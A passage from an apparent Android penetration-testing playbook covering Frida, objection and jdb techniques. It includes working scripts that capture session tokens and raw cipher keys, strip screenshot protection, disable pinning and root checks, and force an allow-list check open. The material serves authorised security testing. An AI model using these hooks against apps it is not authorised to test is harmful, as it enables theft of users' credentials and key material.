- **Ruled out when:** `Java.available` is true and the script still throws — then it is a real script bug,
  not a platform guard problem. See D26-011 for the Frida 17+ case where `Java` is undefined entirely.

### D26-043 · Hooking an abstract framework class records NOTHING — hook the concrete type

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none; the cost is a **false negative** on a D10/D11/D06 finding |
| **Attacker** | AM-12 |
| **Applies to** | all Java hooking |
| **Maps to** | MASTG-TECH-0043 (Method Hooking), MASTG-TECH-0042 (Getting Loaded Classes and Methods Dynamically); `ContentSettingsAdapter extends WebSettings` in the Chromium WebView glue |

- **Test:** Zero events from a hook on a framework base class is a **false negative**, not a result. Print
  `$className` of a live instance and hook that.
- **How:**

  | Do not hook | Hook instead | How to find the right one |
  |---|---|---|
  | `android.webkit.WebSettings` (abstract) | `com.android.webview.chromium.ContentSettingsAdapter` (varies by WebView provider) | `Java.choose('android.webkit.WebView')` -> `wv.getSettings().$className` |
  | `android.content.Context` (abstract) | `android.app.ContextImpl` | `Java.choose` on an Activity -> walk `getBaseContext().$className` |
  | `android.content.SharedPreferences$Editor` (interface) | `android.app.SharedPreferencesImpl$EditorImpl` | print `$className` of a live editor |
  | Any `<X>$Stub` AIDL interface method | the app's concrete `<X>$Stub` subclass, or `android.os.Binder.onTransact` | `Java.enumerateLoadedClasses` filtered on `\$Stub$` |

  ```javascript
  Java.perform(function () {
    Java.choose('android.webkit.WebView', {
      onMatch: function (wv) {
        Java.scheduleOnMainThread(function () {
          var s = wv.getSettings();
          console.log('[concrete WebSettings] ' + s.$className);
          console.log('  JS=' + s.getJavaScriptEnabled() +
                      ' fileAccess=' + s.getAllowFileAccess() +
                      ' fileFromURL=' + s.getAllowFileAccessFromFileURLs() +
                      ' universal=' + s.getAllowUniversalAccessFromFileURLs());
        });
      },
      onComplete: function () {}
    });
  });
  ```
- **Proof:** The printed `$className` of the live object, and a hook on that class producing events where
  the base-class hook produced none.
- **Escalation:** -> D10 (WebView settings and bridges), D11 (`SharedPreferences` writes), D06 (AIDL
  `onTransact`).
- **Ruled out when:** You hooked the class name that a live instance's `$className` actually printed, and
  it still produced zero events after the feature was exercised — then D26-045 (inlining) and D26-047
  (load order) are the remaining explanations before "the code never runs" is admissible. Note
  **WebView getters must run on the main thread** or they throw *"All WebView methods must be called on the
  same thread"* — wrap in `Java.scheduleOnMainThread`.

### D26-044 · Prefer `Java.choose` on live objects over intercepting setters

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none; the cost is a false negative |
| **Attacker** | AM-12 |
| **Applies to** | any property whose value may have been set before you attached |
| **Maps to** | Frida JS API: `Java.choose(cls, {onMatch, onComplete})`, `Java.cast(handle, klass)`, `inst.$className`, `Java.retain(this)`; MASTG-TECH-0044 (Process Exploration) |

- **Test:** A setter hook only catches calls made **after** the hook lands. Splash screens,
  `Application.onCreate` and library initialisers routinely set the exact property you care about before
  any attach is possible. Read the state off the object instead.
- **How:**
  ```javascript
  Java.perform(function () {
    // read state, do not wait for a setter
    Java.choose('com.target.app.net.SessionManager', {
      onMatch: function (sm) {
        console.log('[SessionManager] ' + sm.$className);
        try { console.log('  token=' + sm.getToken()); } catch (e) {}
        Java.retain(sm);                     // keep the instance past the hook
      },
      onComplete: function () {}
    });
    // discover candidate classes and methods by glob when names are unknown
    Java.enumerateMethods('*session*!*token*/i');
    Java.enumerateLoadedClasses({
      onMatch: function (c) { if (c.indexOf('com.target') === 0) console.log(c); },
      onComplete: function () {}
    });
  });
  ```
  objection equivalents: `android heap search instances com.target.app.model.User`,
  `android heap print_instances MainActivity`.
- **Proof:** A property value read off a live instance that the corresponding setter hook never reported —
  that gap is the evidence the setter ran before instrumentation.
- **Escalation:** -> D13 (session/token objects), D12 (key material held in a live object), D10 (WebView
  settings), D23 (entitlement flags).
- **Ruled out when:** `Java.choose` finds no instance of the class **after** the relevant feature has been
  exercised and the class is confirmed loaded (`Java.enumerateLoadedClasses`). No instance plus not loaded
  means the class lives in a secondary loader (-> D26-048), not that the code is absent.

### D26-045 · Deoptimise the VM when a hook on a hot method demonstrably does not fire

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none; the cost is the false claim "the app does not call X" |
| **Attacker** | AM-12 |
| **Applies to** | ART (Android 5.0+); most impactful on release builds with full AOT |
| **Maps to** | Frida `Java.deoptimizeEverything()`, `Java.deoptimizeBootImage()`; objection `android deoptimize` -> `general.deoptimise` (*"Force the VM to execute everything in the interpreter"*) |

- **Test:** If a method you can see in jadx is provably executing — the app behaves as though it ran — but
  your hook prints nothing, ART may have inlined it.
- **How:**
  ```javascript
  Java.perform(function () { Java.deoptimizeEverything(); });
  ```
  ```
  com.target.app on (android: 14) [usb] # android deoptimize
  ```
  Frida also exposes `Java.deoptimizeBootImage()`, documented as best used alongside
  `dalvik.vm.dex2oat-flags --inline-max-code-units=0`.
- **Proof:** The previously-silent hook starts printing after deoptimisation with no other change.
  Contrast that against the app's observable behaviour to prove the method was inlined rather than never
  called.
- **Escalation:** -> D13 (`verifyPin()`), D21 (`isRooted()`), D23 (`isPremium()`) — all small accessor
  methods, all prime inlining candidates, all security-relevant.
- **Ruled out when:** Deoptimisation is active (confirm with `jobs list` under objection) and the hook is
  still silent while the app behaves as if the method ran. Then look at D26-047 and D26-048 before
  concluding anything about the app.

### D26-046 · Blanket-trace Java with `frida-trace -j` to find the method that touches your data

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none standalone; it is the enabling step for High/Critical findings in D09, D12, D13 and D15 |
| **Attacker** | AM-12 |
| **Applies to** | all Android apps. `-j` requires **frida-tools >= 8.0 / Frida >= 12.10** |
| **Maps to** | MASTG-TECH-0033 (Method Tracing), MASTG-TECH-0032 (Execution Tracing); flags verified from frida-tools `tracer.py`; SensePost "Using & improving frida-trace" (2025) |

- **Test:** On a large or obfuscated app, locate the handler for a value you control by tracing wide and
  grepping the trace, rather than by reading decompiled code.
- **How:**
  ```bash
  frida-trace -U -f com.target.app -j 'javax.crypto.Cipher!$init'
  frida-trace -U -p 12345 -j '*json*!*' -j '*JSON*!*' -J '*NoisyClass*!*'
  frida-trace -U -p 12345 -j '*!*certificate*/isu'      # /i case-insensitive /s signatures /u user classes only
  frida-trace -U -p 12345 -j '*!*token*/iu' -o trace.log
  frida-trace -U -n com.target.app -j 'com.target.*!*' -o vendor.log
  frida-trace -U -n com.target.app -i 'open' -i 'openat' -i 'unlinkat'    # native file ops
  ```
  Verified `tracer.py` flags: `-j/--include-java-method`, `-J/--exclude-java-method`,
  `-i/--include [MODULE!]FUNCTION`, `-x/--exclude`, `-I/--include-module`, `-X/--exclude-module`,
  `-a/--add MODULE!OFFSET`, `-T/--include-imports`, `-t/--include-module-imports`, `-m`/`-M` (ObjC),
  `-y`/`-Y` (Swift), `-s/--include-debug-symbol`, `-q/--quiet`, `-d/--decorate`, `-S/--init-session PATH`,
  `-P/--parameters PARAMETERS_JSON`, `-o/--output`, `--ui-host`, `--ui-port`, `--ui-allow-origin`. The
  query modifiers `/i`, `/s`, `/u` are documented in MASTG-TECH-0033.
- **Proof:** `trace.log` containing a call frame whose arguments include your canary value — the OTP you
  typed, or an 8+ character random marker you injected into a deep link (D26-068). That frame's
  `Class!method` is the sink to hook precisely.
- **Escalation:** Identified sink -> targeted `Java.use` hook -> argument tampering (-> D09, D13, D15).
- **Ruled out when:** A pattern matched N > 0 functions, the feature was exercised, and your marker never
  appeared in the trace — then the value is handled natively (-> D26-058, D26-060) or in a cross-platform
  runtime (-> D19). A pattern matching **zero** functions rules out nothing; see D26-047.

### D26-047 · `frida-trace` reporting "Started tracing 0 functions" is a load-order artefact

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all; especially app-bundle dynamic feature modules and `DexClassLoader` users |
| **Maps to** | SensePost "Using & improving frida-trace" (2025) — spawn with `-f` may fail because classes have not loaded yet |

- **Test:** When a `-j` pattern matches nothing on spawn, re-run attached to the live PID before
  concluding the class does not exist.
- **How:**
  ```bash
  frida-trace -U -f com.target.app -j 'com.target.crypto.*!*'     # -> "Started tracing 0 functions"
  # let the app run, then:
  frida-ps -Uai | grep com.target.app
  frida-trace -U -p <pid> -j 'com.target.crypto.*!*'
  ```
- **Proof:** The same pattern matching **0** on `-f` and **N** on `-p`. That delta is evidence the class
  lives in a secondary dex or a dynamically-installed class loader — a D17 lead in its own right.
- **Escalation:** -> D26-048 for the loader, -> D17 (dynamic code loading, feature splits, OTA bundles).
- **Ruled out when:** The pattern matches zero functions under **both** `-f` and `-p` after the feature
  that should load the class has been exercised, **and** `Java.enumerateClassLoaders` shows no loader
  containing it. Only then is "the class is not present" a statement about the app.

### D26-048 · Reach classes in secondary dex and custom class loaders

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | routed to D17 |
| **Attacker** | AM-12 |
| **Applies to** | apps using dynamic feature modules, `DexClassLoader`/`PathClassLoader`, plugin frameworks, packers |
| **Maps to** | Frida JS API `Java.enumerateClassLoaders`, `Java.ClassFactory.get(loader)`, `Java.openClassFile(path).load()` / `.getClassNames()`; MASTG-TECH-0042 (Getting Loaded Classes and Methods Dynamically) |

- **Test:** `Java.use` resolves against the default class factory only. A class loaded by a different
  loader is invisible to it, and reads as "not present".
- **How:**
  ```javascript
  Java.perform(function () {
    Java.enumerateClassLoaders({
      onMatch: function (loader) {
        try {
          var f = Java.ClassFactory.get(loader);
          var C = f.use('com.target.crypto.KeyVault');       // throws if not in THIS loader
          console.log('[+] found in ' + loader.$className);
          C.derive.implementation = function (a) {
            console.log('[derive] ' + a); return this.derive(a);
          };
        } catch (e) {}
      },
      onComplete: function () {}
    });
    // a dex you recovered or dropped yourself:
    var cf = Java.openClassFile('/data/local/tmp/payload.dex');
    console.log(cf.getClassNames().join('\n'));
    cf.load();
  });
  ```
  Pair with `frida-DEXdump` when a packer is present (APKiD `packer` line, D26-023).
- **Proof:** A hook installed via `Java.ClassFactory.get(loader)` firing on a class that `Java.use` could
  not resolve, with the loader's `$className` printed.
- **Escalation:** -> D17 (dynamic code loading, the loaded dex's origin and integrity), D19 (framework
  runtimes), D02 (the executed code is not the shipped code).
- **Ruled out when:** Every enumerated loader was tried and none resolves the class, after the feature was
  exercised. A single `Java.use` failure rules out nothing whatsoever.

### D26-049 · The six Frida corrections that each cost a working day

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all Frida work |
| **Maps to** | MASTG-TECH-0043 (Method Hooking); local senior-researcher corpus, recorded from engagements |

- **Test:** Six specific, recurring corrections. Each one produced a wrong conclusion before it was known.
- **How:**
  1. **Hooking an abstract framework class silently records nothing** — prefer reading state from live
     objects (D26-043, D26-044).
  2. **WebView getters must run on the main thread**, else *"All WebView methods must be called on the
     same thread"*. Wrap:
     ```javascript
     Java.scheduleOnMainThread(function () { Java.perform(function () { /* ... */ }); });
     ```
  3. **`frida -f` spawns the app itself**, so you cannot also deliver an external Intent to that launch.
     Use spawn gating (`device.enable_spawn_gating()` + `on('spawn-added')` -> attach -> resume), or
     attach with `-p` and invoke the parsing method directly.
  4. **Killing `frida -f` kills the app.** Attach with `-p <pid>` whenever the app must survive.
  5. **Module constants are read once at initialisation** — patching a constant after the module has
     initialised changes nothing (this bites hardest in cross-platform runtimes, -> D19).
  6. **Python `subprocess` rejects an embedded NUL**: a `\x00` payload raises
     `ValueError: embedded null byte`. Use the wire form (`%00`) when driving `adb` from Python.
- **Proof:** Events appearing where a naive hook produced zero; a payload delivered intact where the
  previous attempt silently truncated.
- **Escalation:** Each correction unblocks a different chapter: 1 and 2 -> D10, 3 -> D08/D09, 5 -> D19,
  6 -> D07/D09 payload delivery.
- **Ruled out when:** Not a finding. Each correction is either applicable to your script or it is not;
  the failure mode is applying none of them and blaming the target.

### D26-050 · objection as the pre-built hook harness — with job discipline and the sqlite caveat

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none. A pinning bypass is a *technique*; `mobile_security_misconfiguration.ssl_certificate_pinning.defeatable` is **P5** |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | MASTG-TOOL-0029 (objection (Android)), MASTG-TOOL-0038 (objection); command tree verified from `objection/console/commands.py` and the agent sources `agent/src/android/{pinning,root,keystore,hooking,heap,clipboard,userinterface,proxy,general}.ts` |

- **Test:** Get instant coverage of the common hooks, then verify you are not stacking conflicting jobs —
  a root bypass that overrides `File.exists` will interfere with a filesystem test in the same session.
- **How:**
  ```bash
  pipx install objection
  objection -g com.target.app explore
  objection --gadget com.target.app explore --startup-script emulator_detection_bypass.js
  objection --gadget com.target.app explore --startup-command 'android sslpinning disable --quiet'
  objection --gadget <pid> explore          # re-attach after a detach
  ```
  ```
  env                                              # paths, sometimes secrets
  android hooking list activities|services|receivers com.target.app
  android hooking get current_activity
  android hooking search classes 'com.target'
  android hooking list class_methods com.target.app.MainActivity
  android hooking watch class_method com.target.app.MainActivity.check --dump-args --dump-backtrace --dump-return
  android hooking watch class com.target.app.MainActivity --dump-args --dump-return
  android hooking set return_value com.target.app.MainActivity.isRooted false
  android heap search instances com.target.app.SessionManager
  android heap print_instances MainActivity
  android keystore list
  android clipboard monitor
  android sslpinning disable
  android root disable
  android deoptimize
  android ui FLAG_SECURE false
  android ui screenshot /tmp/evidence_01.png
  memory list modules | grep target
  memory list exports libfoo.so
  memory dump all 'all.dmp' ; memory dump from_base 0x77bbc000 4096 'region.dmp'
  memory search 'api' --string
  sqlite connect credentials.db ; sqlite execute schema ; sqlite execute query select * from data ; sqlite sync
  filesystem cat /data/data/com.target.app/shared_prefs/auth.xml
  jobs list ; jobs kill <job-id>
  commands history ; commands save /tmp/session.txt
  import /path/to/custom.js ; evaluate <js>
  reconnect_spawn
  ```
- **Proof:** `jobs list` enumerating every installed hook by identifier (`android-sslpinning-disable`,
  `root-detection-disable`), so the report can prove exactly which instrumentation was active when the
  evidence was captured. That output is **required evidence hygiene** for any finding captured under
  instrumentation — it is what lets a reader distinguish a client-side-only bypass from a real one.
- **Escalation:** -> D10–D14, D20, D23. `android keystore list` -> D12; `android heap search instances`
  -> D13; `memory search --string` -> D11/D12.
- **Ruled out when:** `jobs list` shows the hook installed, the command returned success, and the expected
  behaviour did not change. Two caveats that produce false negatives: **objection's `sqlite` copies the
  remote DB to a local temp directory, executes queries locally, and only writes back on `sqlite sync`** —
  so "no effect on the app" does not mean the query failed; and a stacked job (root bypass overriding
  `File.exists`) can mask the very filesystem behaviour you are testing, so kill jobs between tests.

### D26-051 · Strip `FLAG_SECURE` so the evidence can actually be captured

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none. `mobile_security_misconfiguration.*` and `insecure_data_storage.screen_caching_enabled` are **P5** — the presence of `FLAG_SECURE` is the app behaving correctly |
| **Attacker** | AM-12 (evidence capture only) |
| **Applies to** | any app that sets `FLAG_SECURE` on the screen your PoC must show |
| **Maps to** | `android.view.WindowManager$LayoutParams.FLAG_SECURE` (0x00002000); objection `android ui FLAG_SECURE false`; MASTG-TOOL-0024 (Scrcpy) |

- **Test:** `FLAG_SECURE` blocks screenshots, remote displays and recents snapshots — including the
  evidence a triager needs. Strip it at runtime for capture, and say in the report that you did.
- **How:**
  ```javascript
  // frida -U -f com.target.app -l disable-flag-secure.js --no-pause
  Java.perform(function () {
    var LP = Java.use('android.view.WindowManager$LayoutParams');
    var FLAG_SECURE = LP.FLAG_SECURE.value;          // 0x00002000
    var Window = Java.use('android.view.Window');
    var Activity = Java.use('android.app.Activity');
    function strip(v) { return v & (~FLAG_SECURE); }
    Window.setFlags.overload('int','int').implementation = function (f, m) {
      return this.setFlags.call(this, strip(f), strip(m)); };
    Window.addFlags.implementation = function (f) { return this.addFlags.call(this, strip(f)); };
    Window.setAttributes.implementation = function (a) {
      a.flags.value = strip(a.flags.value); return this.setAttributes.call(this, a); };
    Activity.onResume.implementation = function () {
      this.onResume(); var self = this;
      Java.scheduleOnMainThread(function () {
        try { self.getWindow().clearFlags(FLAG_SECURE); } catch (e) {} });
    };
  });
  ```
  ```bash
  adb exec-out screencap -p > evidence/F-007/01.png
  adb shell screenrecord --bit-rate 8000000 --time-limit 180 /sdcard/poc.mp4 && adb pull /sdcard/poc.mp4
  scrcpy --record poc.mp4
  ```
  Hook **every** overload that can re-apply the flag (`setFlags`, `addFlags`, `setAttributes`) and clear
  it again after each `onResume` so Dialogs and Fragments inherit the unlocked state. React Native and
  Flutter apps create nested windows — also hook `android.app.Dialog` or walk
  `getWindow().peekDecorView()` if black frames persist.
- **Proof:** `screencap`/`screenrecord` producing real frames of the protected screen. Note the inverse:
  a `FLAG_SECURE` screen capturing as **black** is itself the evidence that the D20 screenshot control
  works — record that as a ruled-out entry rather than a gap.
- **Escalation:** -> D27 (evidence), D20 (the control's presence or absence).
- **Ruled out when:** Frames still render black after all three overloads are hooked and `onResume` clears
  the flag — then the surface is a `SurfaceView`/DRM path, and stills composed from a second device
  (D26-013) are the honest alternative. Never report the *presence* of `FLAG_SECURE` as a finding.

### D26-052 · Inject StrictMode's own detectors and let the app find its unsafe intent launches for you

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | routed to D08: `broken_access_control.exposed_sensitive_android_intent` (**null — rated on what it exposes**), reaching `broken_authentication_and_session_management.authentication_bypass` (P1) where the redirected intent reaches an authenticated component |
| **Attacker** | AM-03 zero-permission local app for the resulting finding |
| **Applies to** | `detectUnsafeIntentLaunch()` needs an **Android 12+ (API 31)** test device; `detectBlockedBackgroundActivityLaunch()` needs **Android 16+**. The underlying bug exists on all versions — the detector is only the discovery tool |
| **Maps to** | MASTG-TECH-0043 (Method Hooking); rule `mastg-android-strictmode`; Android 12 behaviour change "Unsafe Intent Launch Detection"; `developer.android.com/guide/components/activities/background-starts` (`detectBlockedBackgroundActivityLaunch()`) |

- **Test:** Rather than reading code for nested-intent launches, make the app report them. Inject the
  detector at process start and then drive every exported entry point.
- **How:**
  ```javascript
  // frida -U -f com.target.app -l strict.js --no-pause
  Java.perform(function () {
    var SM = Java.use('android.os.StrictMode');
    var B  = Java.use('android.os.StrictMode$VmPolicy$Builder');
    var b = B.$new().detectUnsafeIntentLaunch().penaltyLog();
    try { b = b.detectBlockedBackgroundActivityLaunch(); } catch (e) {}
    SM.setVmPolicy(b.build());
    console.log('[strictmode] detectors armed');
  });
  ```
  ```bash
  adb logcat -c
  adb logcat -v year -v UTC | grep -iE 'StrictMode|UnsafeIntentLaunch' &
  # drive every exported component
  adb shell dumpsys package com.target.app | grep -oE 'com\.target\.app/[A-Za-z0-9_.$]+' | sort -u \
    | while read -r c; do adb shell am start -n "$c" --es x 1 2>/dev/null; done
  ```
  Other platform-mitigation strings worth grepping in the same run, each of which is a "the platform
  blocked it" negative result you can cite:
  ```bash
  grep -E "Indirect notification activity start \(trampoline\) from" run.log   # A12 trampoline block
  grep -E "Untrusted touch due to occlusion by" run.log                        # A12 tapjacking block
  grep -E "Intent does not match component's intent filter:|Access blocked:" run.log  # A16 intent matching
  grep -E "sendto failed: (EPERM|ECONNABORTED)" run.log                        # A16 local network
  grep -E "ForegroundServiceStartNotAllowedException" run.log                  # A12/14/15 FGS
  grep -E "realCallingPackage|callingPackage" run.log                          # BAL attribution
  ```
- **Proof:** A `StrictMode` violation entry with a full stack trace naming the class and method that
  unparcelled a nested intent and immediately launched a component — a runtime-confirmed D08 site with no
  source reading.
- **Escalation:** -> D08 (intent redirection / PendingIntent), D04 (activity launch), D05 (broadcast).
- **Ruled out when:** The detector is confirmed armed (the `[strictmode] detectors armed` line), every
  exported component has been driven with a nested-intent extra, and no violation is logged. On a test
  device below API 31 the detector does not exist at all and the absence of violations means nothing —
  state the device's API level next to the result.

### D26-053 · Instrument the binder layer, not only the Java API

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | routed to D06/D08 |
| **Attacker** | AM-12 for observation; AM-03 for the resulting finding |
| **Applies to** | all; indispensable where third-party SDKs never touch the app's own Java classes |
| **Maps to** | AOSP AIDL transaction model; `android.os.Binder.FLAG_ONEWAY`, `Binder.getCallingUid()`; MASTG-TECH-0043 |

- **Test:** Hooking `BinderProxy.transact` and `Binder.execTransact` gives you every IPC the app makes and
  every one it serves, including calls made by SDKs whose class names you will never guess.
- **How:**
  ```javascript
  Java.perform(function () {
    var BP = Java.use('android.os.BinderProxy');
    BP.transact.implementation = function (code, data, reply, flags) {
      var iface = '';
      try { iface = this.getInterfaceDescriptor(); } catch (e) {}
      console.log('[->] ' + iface + ' code=' + code + ' flags=' + flags +
                  ((flags & 1) ? ' ONEWAY' : '') + ' size=' + data.dataSize());
      return this.transact(code, data, reply, flags);
    };
    var B = Java.use('android.os.Binder');
    B.execTransact.overload('int','long','long','int').implementation = function (code, dp, rp, flags) {
      console.log('[<-] incoming code=' + code + ' callingUid=' + B.getCallingUid());
      return this.execTransact(code, dp, rp, flags);
    };
  });
  ```
  ```bash
  adb shell service list > services.txt
  adb shell dumpsys activity services com.target.app
  ```
- **Proof:** A transaction log naming the interface descriptors the app talks to and the incoming
  transactions it serves — the ground truth for D06, and the only reliable way to see an SDK's own IPC.
- **Escalation:** -> D06 (AIDL/bound services, and whether `getCallingUid()` is actually checked), D08
  (what arrives in the Parcel), D17 (Parcel write/read mismatches).
- **Ruled out when:** The transaction log is populated (proving the hook works) and contains no incoming
  transaction for the component you are testing after it was invoked — then the component is genuinely
  unreachable from your caller. An empty log is a hook failure, not a result.

### D26-054 · The one-file framework-API hook pack for obfuscated apps

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | routed: `cryptographic_weakness.key_reuse.inter_environment` (P2) for captured key material, `broken_access_control.exposed_sensitive_android_intent` (null) for the intent trace, D10's rating for the WebView lines |
| **Attacker** | AM-12 for capture; convert before reporting |
| **Applies to** | all; the point is that R8 renames the app's classes but never `Cipher`, `WebView`, `PendingIntent`, `Binder` or `SecretKeySpec` |
| **Maps to** | MASTG-TECH-0043 (Method Hooking), MASTG-TECH-0173 (Monitoring Deep Link Handlers at Runtime with Frida), MASTG-TOOL-0032 (Frida CodeShare); CodeShare `@fadeevab/intercept-android-apk-crypto-operations`, `@dzonerzy/aesinfo`, `@owen800q/okhttp3-interceptor`, `@leolashkevych/android-deep-link-observer` |

- **Test:** Instrument the framework APIs every bug class funnels through, so one trace file becomes the
  evidence trail for several findings at once.
- **How:**
  ```javascript
  // hooks.js — one file covering D06/D08/D09/D10/D11/D12/D15
  Java.perform(function () {
    var log = function (t, s) { console.log('[' + t + '] ' + s); };

    var WV = Java.use('android.webkit.WebView');
    WV.loadUrl.overload('java.lang.String').implementation = function (u) {
      log('loadUrl', u); return this.loadUrl(u); };
    WV.addJavascriptInterface.implementation = function (o, n) {
      log('bridge', n + ' <- ' + o.$className); return this.addJavascriptInterface(o, n); };

    var C = Java.use('javax.crypto.Cipher');
    C.getInstance.overload('java.lang.String').implementation = function (t) {
      log('Cipher.getInstance', t); return this.getInstance(t); };
    var SKS = Java.use('javax.crypto.spec.SecretKeySpec');
    SKS.$init.overload('[B','java.lang.String').implementation = function (k, a) {
      log('SecretKeySpec', a + ' ' + Java.use('android.util.Base64').encodeToString(k, 2));
      return this.$init(k, a); };

    var Ctx = Java.use('android.content.ContextWrapper');
    Ctx.startActivity.overload('android.content.Intent').implementation = function (i) {
      log('startActivity', i.toUri(1)); return this.startActivity(i); };
    Ctx.sendBroadcast.overload('android.content.Intent').implementation = function (i) {
      log('sendBroadcast', i.toUri(0)); return this.sendBroadcast(i); };

    var Act = Java.use('android.app.Activity');
    Act.getIntent.implementation = function () {
      var i = this.getIntent(); log('getIntent', i ? i.toUri(0) : 'null'); return i; };

    var PI = Java.use('android.app.PendingIntent');
    ['getActivity','getBroadcast','getService'].forEach(function (m) {
      PI[m].overload('android.content.Context','int','android.content.Intent','int')
        .implementation = function (c, rc, i, f) {
          log('PendingIntent.' + m, 'rc=' + rc + ' flags=0x' + f.toString(16) + ' ' + i.toUri(0));
          return this[m](c, rc, i, f); };
    });

    var CR = Java.use('android.content.ContentResolver');
    CR.openInputStream.implementation = function (u) {
      log('openInputStream', u.toString()); return this.openInputStream(u); };

    var HUC = Java.use('java.net.HttpURLConnection');
    HUC.connect.implementation = function () { log('HttpURLConnection', this.getURL()); return this.connect(); };
    try {
      var OK = Java.use('okhttp3.OkHttpClient');
      OK.newCall.implementation = function (req) {
        log('okhttp', req.url().toString() + ' ' + req.headers().toString()); return this.newCall(req); };
    } catch (e) {}
  });
  ```
- **Proof:** `Intent.toUri(0)` gives the complete intent — action, categories, data, component, flags and
  extras — in **one replayable string**, which you feed straight back with
  `adb shell am start -a ... -d ...` or reconstruct in the attacker app. `SecretKeySpec` gives you the raw
  key bytes base64-encoded. `PendingIntent` gives you the mutability flags.
- **Escalation:** -> D06, D08 (PendingIntent mutability, nested intents), D09 (deep-link parameters),
  D10 (bridge inventory, loaded URLs), D12 (key material), D15 (endpoints and headers the static sweep
  missed).
- **Ruled out when:** The trace is populated for other calls (proving the hooks are live) and the specific
  API you care about never appears after the feature is exercised. Then the path is native (-> D26-058) or
  in a cross-platform runtime (-> D19), not absent.

### D26-055 · Force a stack trace at the sink to supply the reachability argument

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none; it is what converts "this method is dangerous" into "this method is reachable from an exported component", which is the difference between P5 and a rating |
| **Attacker** | AM-12 for capture |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0043; MASTG-TECH-0173; Frida `Java.backtrace({limit})`; `Log.getStackTraceString(Exception.$new())` |

- **Test:** When you have a sink — a network call, a crypto method, a file write — but not the path that
  reaches it, force a stack trace there. It is faster than reading an obfuscated call graph and it finds
  callers static analysis misses.
- **How:**
  ```javascript
  // the MASTG backtrace helper, used across its demo scripts
  function printBacktrace(maxLines) {
    maxLines = maxLines || 8;
    Java.perform(function () {
      var Exception = Java.use('java.lang.Exception');
      var st = Exception.$new().getStackTrace().toString().split(',');
      console.log('\nBacktrace:');
      for (var i = 0; i < Math.min(maxLines, st.length); i++) console.log('  ' + st[i]);
    });
  }
  Java.perform(function () {
    var F = Java.use('java.io.FileOutputStream');
    F.$init.overload('java.io.File').implementation = function (f) {
      console.log('[write] ' + f.getAbsolutePath()); printBacktrace(12); return this.$init(f); };
  });
  ```
  objection equivalent, with no script to write:
  ```
  android hooking watch class_method com.target.app.X.check --dump-args --dump-return --dump-backtrace
  ```
- **Proof:** The printed stack showing which exported component reaches the sensitive sink. MASTG's own
  dynamic tests end with *"Using the backtraces from the hook output, inspect the code locations"* —
  without a backtrace you cannot complete the evaluation step.
- **Escalation:** Supplies the reachability half of every finding in D04–D10 and D16.
- **Ruled out when:** The sink fires (so the hook is live) and no frame in the backtrace belongs to an
  exported component or an attacker-influenced path — then the sink is internal-only and the finding
  downgrades to at most a code-quality note.

### D26-056 · JDWP and `jdb` — the Frida-free path when instrumentation is detected

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | routed to whatever the read variable protects (D10 bridge allow-list, D13 gate) |
| **Attacker** | AM-11 physical unlocked |
| **Applies to** | **debuggable builds only** — shipped `android:debuggable="true"` (which is D26-038's finding) or a build you repacked debuggable (which is your patch, not a finding) |
| **Maps to** | MASTG-TOOL-0019 (jdb), MASTG-TECH-0031 (Debugging), MASTG-TECH-0040 (Waiting for the Debugger), MASTG-TECH-0038 (Patching) |

- **Test:** When Frida is detected or the app crashes under instrumentation, break in the validator and
  read exactly what the gate compares — no hooking framework involved.
- **How:**
  ```bash
  # make it debuggable if it is not (this is YOUR patch — say so in the report)
  apktool d -o out target.apk
  #   set android:debuggable="true" on <application> in out/AndroidManifest.xml
  apktool b -o patched.apk out && java -jar uber-apk-signer.jar -a patched.apk --out signed
  adb install signed/patched-aligned-debugSigned.apk
  adb shell am set-debug-app -w com.target.app
  adb jdwp
  adb forward tcp:8000 jdwp:<pid>
  jdb -attach localhost:8000
  ```
  ```
  stop in com.target.app.web.BridgeGuard.isAllowed
  locals
  print url
  print allowList
  set allowed = true
  ```
  The smali alternative when you only need the branch flipped: patch the comparison to
  `const/4 v0, 0x1`, rebuild, re-sign.
- **Proof:** The printed value of the URL, origin or allow-list variable **at the decision point** —
  which is what an allow-list finding needs, rather than an inference from decompiled code.
- **Escalation:** -> D10 (bridge origin gating), D13 (local gate), D21 (as the fallback when anti-Frida is
  present, and the effort required is itself the resilience evidence).
- **Ruled out when:** `adb jdwp` lists no PID for the app while it is in the foreground — the build is not
  debuggable and this route is closed. Remember `am set-debug-app -w` suspends the app until a debugger
  attaches; clear it with `am clear-debug-app` at teardown.

### D26-057 · Syscall and file-operation tracing as the ground truth under the Java API

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | routed to D11/D16/D21 |
| **Attacker** | AM-12 |
| **Applies to** | rooted or userdebug devices; `strace` typically needs root |
| **Maps to** | MASTG-TECH-0032 (Execution Tracing), MASTG-TECH-0027 (Get Open Files — `NAME` and `TYPE` are the relevant columns), MASTG-TECH-0028 (Get Open Connections — `rem_address`, `tx_queue`/`rx_queue`, `uid` in `/proc/<pid>/net/tcp`), MASTG-TECH-0030 (Sandbox Inspection), MASTG-TECH-0143 (Monitor File System Operations in WebViews) |

- **Test:** Catch behaviour that never crosses a Java API — native file access, root checks, WebView
  internals, linker- and SDK-driven opens the app's own code never names.
- **How:**
  ```bash
  PID=$(adb shell pidof com.target.app | tr -d '\r')
  adb shell su -c "strace -f -p $PID -e trace=openat,ioctl,mmap,execve,unlinkat -s 200" 2>&1 | tee strace.log
  grep -c 'BINDER_WRITE_READ' strace.log
  grep -E 'openat\(.*(kgsl|mali|dri|binder|apex|dalvik-cache|code_cache)' strace.log | sort -u | head -40
  adb shell lsof -p $PID
  adb shell lsof -p $PID | grep /app_webview/
